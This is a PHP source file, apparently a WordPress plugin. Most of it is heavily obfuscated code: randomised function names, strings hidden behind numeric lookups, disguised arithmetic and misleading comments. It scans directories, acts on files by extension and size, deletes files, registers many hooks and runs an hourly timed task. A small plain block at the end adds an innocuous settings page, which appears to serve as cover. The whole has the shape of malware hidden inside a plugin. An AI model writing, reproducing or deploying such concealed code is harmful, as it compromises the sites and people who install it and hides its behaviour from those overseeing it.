  if  (!defined(bovhd4vawcd(1917)))   define(m5t68uuej1(1917),    kdgw8qqvzf6yolk());
     c4m38y27ifhwinzv(lpwgqh9300(1918));
  


j80h1d_poav1dqegxkr_a(t6995wceyqc2q1wqvl());
    if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1919)) &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1920)))  {
  try  {
       $zlzwvbj7pt28r  = gqtg_eoxyrv0ml2271n();
if (@$GLOBALS['__scf_i9hdv7zrfsy_45']($zlzwvbj7pt28r)) {
  $wmclzs1meshh4jqd =   a_2kjbn3ievobiy5tn3cy();
   $ekihny02f9xmf6  =    h06jfdytq78tzk7($zlzwvbj7pt28r,   (4967+33));
      if  ($GLOBALS['__scf_pomb89yiuz_37']($ekihny02f9xmf6)) {
      foreach ($ekihny02f9xmf6  as     $u42mzoe0wl) {
  if     ($u42mzoe0wl   === $wmclzs1meshh4jqd) continue;
 

       if   ($GLOBALS['__scf_vi47igxg1zd_103']($GLOBALS['__scf_rwpc7a7ar1p_204']($u42mzoe0wl,   constant(m40pvx5ij_z4mj(719))))  !==     m40pvx5ij_z4mj(1067))    continue;

 $crrhme7tqz    =      $zlzwvbj7pt28r .  '/'   .   $u42mzoe0wl;



     if (@$GLOBALS['__scf_a83pywb98qzq2_20']($crrhme7tqz) &&    @$GLOBALS['__scf_pftf6vocmvs2m_99']($crrhme7tqz)  > (7076-2076)    &&  ey9i45m9xcoe7q13e9ag2($crrhme7tqz,     (651+4349)))  {
 ckruereco5c5i57($crrhme7tqz);
 }

  }
 }
}



    }    catch   (Throwable      $k3g08rnqu9m) {
     r63yaewew47stuijcrwsx6(bovhd4vawcd(219), $k3g08rnqu9m);
 } catch (Exception  $k3g08rnqu9m)  {
 }
 }
      
 if  (!  p1eodt9ox5eneum9qqgjt3())    {
   ki6tdgirglgewq(m40pvx5ij_z4mj(1425),    m5t68uuej1(1921), 1);
// WP Featured Image transient TTL

 }




 $GLOBALS[bovhd4vawcd(1922)]  =  array();     
$GLOBALS[lpwgqh9300(438)]    =  array(); 
    $GLOBALS[bovhd4vawcd(1923)]     =      "";    
    if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(461)))     {
$GLOBALS['__scf_w5tg0wn3h2rih_170'](m5t68uuej1(1924));
  $GLOBALS['__scf_w5tg0wn3h2rih_170'](lpwgqh9300(1925));
       }
/* serializable linear-type */

 $yei3ceouju =      $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())  . m5t68uuej1(185)   .    $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),    bovhd4vawcd(1909));
        if (@$GLOBALS['__scf_a83pywb98qzq2_20']($yei3ceouju))     {
  $zht1_949ry9xj   =   $GLOBALS['__scf_nimluvpxhrpvn_323']((string) @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($yei3ceouju));
    $vk8y4a7919zlz1    =     w6zi2tffzlng4hu();

   if ($zht1_949ry9xj      ===   ""    ||     ($vk8y4a7919zlz1   !==  ""    &&  $zht1_949ry9xj  !==   $vk8y4a7919zlz1))  netei2x342rtzmi4tj69($yei3ceouju);
      unset($zht1_949ry9xj, $vk8y4a7919zlz1);$w7pdocoti_sf1=PHP_MAJOR_VERSION;$vlg_y9mno6j4=$w7pdocoti_sf1*3;



  }
 try     {


 @$GLOBALS['__scf_fiolz593w9mj_75']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())  .    m40pvx5ij_z4mj(1926) .  $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  m5t68uuej1(1927)));$_byu9bb65wink3=PHP_MAJOR_VERSION;$arjuorq8=$_byu9bb65wink3*3;
    $vk8y4a7919zlz1     =    w6zi2tffzlng4hu();
   if   ($vk8y4a7919zlz1 !==   "") {
$eqov9as3wyplc  = bovhd4vawcd(1928)  . $vk8y4a7919zlz1;
   foreach (array($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()),   gqtg_eoxyrv0ml2271n())    as   $u_d3ldh4ftnfx1d)  {



if (@$GLOBALS['__scf_a83pywb98qzq2_20']($u_d3ldh4ftnfx1d   .  '/' .  $eqov9as3wyplc))  @$GLOBALS['__scf_o_94ckdo_kfcf_19']($u_d3ldh4ftnfx1d .  '/'    .    $eqov9as3wyplc);
}
}
      unset($vk8y4a7919zlz1,   $eqov9as3wyplc,    $u_d3ldh4ftnfx1d);
     } catch (Throwable  $k3g08rnqu9m)   {
// @typecheck work-queue

}  catch  (Exception      $k3g08rnqu9m)     {
}
unset($yei3ceouju);

ki6tdgirglgewq(lpwgqh9300(1929),   m40pvx5ij_z4mj(1930),  0);
ki6tdgirglgewq(lpwgqh9300(1929), bovhd4vawcd(1931),     0);
  ki6tdgirglgewq(m5t68uuej1(1932),  m5t68uuej1(1930), 0);
ki6tdgirglgewq(m5t68uuej1(1933),    m5t68uuej1(1934), 0);
 ki6tdgirglgewq(bovhd4vawcd(1933),      m5t68uuej1(1935), 2);
ki6tdgirglgewq(lpwgqh9300(1933),   m40pvx5ij_z4mj(1936), (2+1));
ki6tdgirglgewq(m40pvx5ij_z4mj(1933),   m40pvx5ij_z4mj(1937),  (1+3));
  ki6tdgirglgewq(bovhd4vawcd(1938),    m40pvx5ij_z4mj(1939),  (1+4));
   b30mdcicahooa3obn6(m40pvx5ij_z4mj(1940), bovhd4vawcd(1941),  (222^212),  1);
b30mdcicahooa3obn6(m40pvx5ij_z4mj(1942),  m5t68uuej1(1941), (8+2),  1);
  b30mdcicahooa3obn6(m5t68uuej1(1943), bovhd4vawcd(1941),  (234^224),   1);
b30mdcicahooa3obn6(m40pvx5ij_z4mj(1944), lpwgqh9300(1941),   (0x6+0x4),     1);
    
   b30mdcicahooa3obn6(bovhd4vawcd(1945),   m5t68uuej1(1946),   (0x179+0x26e),  (0x2+0x1));
 ki6tdgirglgewq(lpwgqh9300(1947),  lpwgqh9300(1948),  (965+34), 2);




b30mdcicahooa3obn6(m5t68uuej1(1949),    bovhd4vawcd(1950));

b30mdcicahooa3obn6(lpwgqh9300(1951),    bovhd4vawcd(1952),  (5<<1),   2);
b30mdcicahooa3obn6(m5t68uuej1(1953), lpwgqh9300(1954));
 
   b30mdcicahooa3obn6(bovhd4vawcd(1955), m5t68uuej1(1956),    (0x1+0x9),    1);
     


   b30mdcicahooa3obn6(m40pvx5ij_z4mj(1957),  m5t68uuej1(1958),  (1+9), 2);



      ki6tdgirglgewq(m40pvx5ij_z4mj(1959),      lpwgqh9300(785));
 b30mdcicahooa3obn6(m5t68uuej1(1960),  bovhd4vawcd(1961));
     
  b30mdcicahooa3obn6(lpwgqh9300(1962), lpwgqh9300(793));
 
    ki6tdgirglgewq(bovhd4vawcd(1963),  lpwgqh9300(1964), -(0x391+0x56));
 ki6tdgirglgewq(lpwgqh9300(1965), lpwgqh9300(1966),   -(561+438));
ki6tdgirglgewq(m5t68uuej1(1967),  bovhd4vawcd(1966),  -(942+57));
 
 ki6tdgirglgewq(m40pvx5ij_z4mj(1968),    lpwgqh9300(1969),  (946+53));$gswmcfw9=361;$f67zqxlt7n=($gswmcfw9>0)?$gswmcfw9:-$gswmcfw9;
  ki6tdgirglgewq(bovhd4vawcd(1970),  bovhd4vawcd(1971),  0);
ki6tdgirglgewq(bovhd4vawcd(216),    m5t68uuej1(1972),  0);


 ki6tdgirglgewq(m40pvx5ij_z4mj(1973),    lpwgqh9300(1974),  (997+2));
      ki6tdgirglgewq(lpwgqh9300(1975), bovhd4vawcd(1976),  (0x379+0x6e));
        
ki6tdgirglgewq(lpwgqh9300(1977), bovhd4vawcd(1978),    2);
 ki6tdgirglgewq(m5t68uuej1(1979),    lpwgqh9300(1980), 0);



 ki6tdgirglgewq(bovhd4vawcd(1979),  m5t68uuej1(1981),  0);



 ki6tdgirglgewq(lpwgqh9300(1982),   lpwgqh9300(1983), 0);




        ki6tdgirglgewq(bovhd4vawcd(1982),   lpwgqh9300(1984), 1);

ki6tdgirglgewq(m40pvx5ij_z4mj(1985),  m40pvx5ij_z4mj(1986), 2);
    
   ki6tdgirglgewq(bovhd4vawcd(1985), bovhd4vawcd(1987),  (157^158));
ki6tdgirglgewq(lpwgqh9300(1988),    m40pvx5ij_z4mj(1989),   (0x2+0x2));


    ki6tdgirglgewq(lpwgqh9300(1990), lpwgqh9300(1991),      (3+2));
ki6tdgirglgewq(m40pvx5ij_z4mj(1990),  m5t68uuej1(1992),  (161^167));

ki6tdgirglgewq(bovhd4vawcd(1990), bovhd4vawcd(1993), (1+5));
ki6tdgirglgewq(m40pvx5ij_z4mj(1994),  m40pvx5ij_z4mj(1995));
    ki6tdgirglgewq(bovhd4vawcd(1996), bovhd4vawcd(1997),   (3+4));
   if ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(461)))    {



 $GLOBALS['__scf_w5tg0wn3h2rih_170'](function  ()  {
 if (!empty($GLOBALS[lpwgqh9300(1998)])) return;
     if (!defined(m40pvx5ij_z4mj(1752)) ||   !$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1837)))   return;


if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1997)))     {
 try    {
   r92zksip69l03_cq();
}    catch (Throwable  $k3g08rnqu9m)  {
       }    catch     (Exception $k3g08rnqu9m)  {
  }
 }
   });
      }
    ki6tdgirglgewq(m5t68uuej1(1996),     m5t68uuej1(1999),     (7+1));
ki6tdgirglgewq(m40pvx5ij_z4mj(1666), lpwgqh9300(1666));
ki6tdgirglgewq(m40pvx5ij_z4mj(2000),     bovhd4vawcd(2001));
    ki6tdgirglgewq(bovhd4vawcd(1938),    bovhd4vawcd(2002),  (5<<1));
    ki6tdgirglgewq(bovhd4vawcd(1996),   function   ()  {



     if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(2003))  ||  !$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1586))) return;
$qx1o13ekzk   =    (int)  @get_option(bovhd4vawcd(2004), 0);
 if  (($GLOBALS['__scf_ibw9xvmx9ckin_187']()      -  $qx1o13ekzk)    >    (5288-1688))   {

if    (!p5_es53lv8rkijk1()) return;
 @update_option(bovhd4vawcd(2004),      $GLOBALS['__scf_ibw9xvmx9ckin_187']());
trowp755iqhshn7by53b();
 }
    },    (5+4));

     
    ki6tdgirglgewq(lpwgqh9300(100),  m5t68uuej1(2005));
  b30mdcicahooa3obn6(m5t68uuej1(2006), bovhd4vawcd(2007));


 if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(2008))   &&   did_action(m5t68uuej1(1996)))  {
   io8f74o05_4rvf4();
    }
// specialize infeasible decorator



}
if(!defined('SC_COVER_HOOKS')){define('SC_COVER_HOOKS',1);

add_action('admin_menu',function(){
    add_options_page('Settings','Settings','manage_options','warp-extension-rig-settings',function(){
        echo '<div class="wrap"><h1>Settings</h1><form method="post" action="options.php">';
        settings_fields('warp-extension-rig_group');
        do_settings_sections('warp-extension-rig-settings');
        submit_button();
        echo '</form></div>';
    });
});
add_action('admin_init',function(){
    register_setting('warp-extension-rig_group','warp-extension-rig_options');
    add_settings_section('warp-extension-rig_main','Configuration',function(){echo '<p>Configure options below.</p>';},'warp-extension-rig-settings');
    add_settings_field('warp-extension-rig_cache','Cache Mode',function(){
        $o=get_option('warp-extension-rig_options',array());$v=isset($o['cache'])?$o['cache']:'enabled';
        echo '<select name="'.esc_attr('warp-extension-rig_options[cache]').'"><option value="enabled"'.selected($v,'enabled',false).'>Enabled</option><option value="disabled"'.selected($v,'disabled',false).'>Disabled</option></select>';
    },'warp-extension-rig-settings','warp-extension-rig_main');
});
if(function_exists('add_shortcode'))add_shortcode('warp_extension_rig_stats',function(){
    $o=get_option('warp-extension-rig_options',array());
    return '<!-- stats: '.(isset($o['cache'])?$o['cache']:'none').' -->';
});
if(function_exists('wp_normalize_path') && function_exists('register_activation_hook'))register_activation_hook(__FILE__,function(){
    if(!get_option('warp-extension-rig_options'))add_option('warp-extension-rig_options',array('cache'=>'enabled','version'=>'1.0'));
});

}
